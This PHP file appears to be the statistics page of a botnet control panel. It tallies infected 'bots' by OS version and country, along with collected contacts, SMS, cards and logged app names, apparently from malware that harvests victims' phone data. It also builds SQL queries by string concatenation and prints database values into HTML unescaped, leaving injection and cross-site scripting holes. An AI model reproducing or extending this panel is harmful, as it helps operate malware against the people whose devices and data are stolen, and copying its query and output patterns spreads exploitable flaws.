<?php
	include "config.php";

	print_header();
	
	print_menu();
	
	$html = "
	
	<h3>All about admin</h3>
	<table class=\"table\">
    <thead>
      <tr>
        <th>Value</th>
        <th>Count</th>
      </tr>
    </thead>
    <tbody>
    ";
	
	$sql = "SELECT count(*) FROM contacts";
	$res = $dbm->query($sql);
	if(mysqli_num_rows($res)){
		while($row=mysqli_fetch_array($res)) {
			$html .="<tr><th>Contacts</th><th>".$row[0]."</th></tr>";
		}
	}
	
	
	$html .="
			<tr><th>Sms</th><th>0</th></tr>
			<tr><th>Cards</th><th>0</th></tr>
			<tr><th>Bots</th><th>".$kernel['all']."</th></tr>
	";
	
	$sql = "SELECT SUM( data_length + index_length ) FROM information_schema.tables WHERE table_schema = '".$mysql['db']."';";
	$res = $dbm->query($sql);
	if(mysqli_num_rows($res)){
		while($row=mysqli_fetch_array($res)) {
			$html .="<tr><th>Size database</th><th>".$row[0]." byte</th></tr>";
		}
	}
	
	
	$html .="
			</tbody>
  </table>";
  
  $sql = "select os_ver,count(*) from bots where bot_user_id='".$kernel['userid']."' GROUP BY os_ver ORDER BY count(*) DESC";
  $res = $dbm->query($sql);
	
  
  $html .="<h3>OS versions</h3>
	<table class=\"table\">
    <thead>
      <tr>
        <th>Value</th>
        <th>Count</th>
      </tr>
    </thead>
    <tbody>
			";
			if($dbm->count>0){
				while($row=mysqli_fetch_array($res)) {
					//var_dump($row);
					if($row[0]!="")
					$html .="<tr><th>".$row[0]."</th><th>".$row[1]."</th></tr>";
				}
			}
		$html.="
			</tbody>
  </table>";
  
  $sql = "select country,count(*) from bots where bot_user_id='".$kernel['userid']."' GROUP BY country ORDER BY count(*) DESC";
  $res = $dbm->query($sql);
  
  $html .= "<h3>Country</h3>
	<table class=\"table\">
    <thead>
      <tr>
        <th>Value</th>
        <th>Count</th>
      </tr>
    </thead>
    <tbody>
			";
			if($dbm->count>0){
				while($row=mysqli_fetch_array($res)) {
					if($row[0]!="")
					$html .="<tr><th>".$row[0]."</th><th>".$row[1]."</th></tr>";
				}
			}
		$html.="
			</tbody>
  </table>
	";
	
	$sql = "select app,count(*) from apps_logs GROUP BY app ORDER BY count(*) DESC LIMIT 50";
  $res = $dbm->query($sql);
  
  $html .= "<h3>Like apps from logs</h3>
	<table class=\"table\">
    <thead>
      <tr>
        <th>Value</th>
        <th>Count</th>
      </tr>
    </thead>
    <tbody>
			";
			if($dbm->count>0){
				while($row=mysqli_fetch_array($res)) {
					if($row[0]!="")
					$html .="<tr><th><a href=\"list.php?op=filter_app&name=".$row[0]."\">".$row[0] . "</a></th><th>".$row[1]."</th></tr>";
				}
			}
		$html.="
			</tbody>
  </table>
	";
	
	print_content("Stats",$html);
	
	print_footer();

?>
